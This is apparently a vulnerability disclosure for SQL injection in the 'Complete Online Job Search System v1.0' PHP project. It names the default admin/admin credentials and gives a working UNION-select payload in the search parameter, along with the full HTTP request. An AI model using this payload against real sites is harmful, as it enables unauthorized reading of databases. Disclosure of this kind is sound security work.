# Complete Online Job Search System v1.0 has SQL injection

The password for the backend login account is: admin/admin

vendors: https://www.campcodes.com/projects/php/online-job-search-system-using-php-mysql-free-download/

Vulnerability File: /eris/index.php?q=category&search=

Vulnerability location: /eris/index.php?q=category&search=,search

Current database name: erisdb

[+] Payload: /eris/index.php?q=category&search=Banking%27%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,database(),15,16,17,18,19--+ // Leak place ---> search

```sql
GET /eris/index.php?q=category&search=Banking%27%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,database(),15,16,17,18,19--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=mho0fs263l0tis8l6v3lqpu6q4
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/170849294-63257142-f64c-42ba-bc04-e359ed18aceb.png)

![image](https://user-images.githubusercontent.com/54017627/170849297-b0af23e4-c3d6-440b-a66e-0d0dc7a08e80.png)
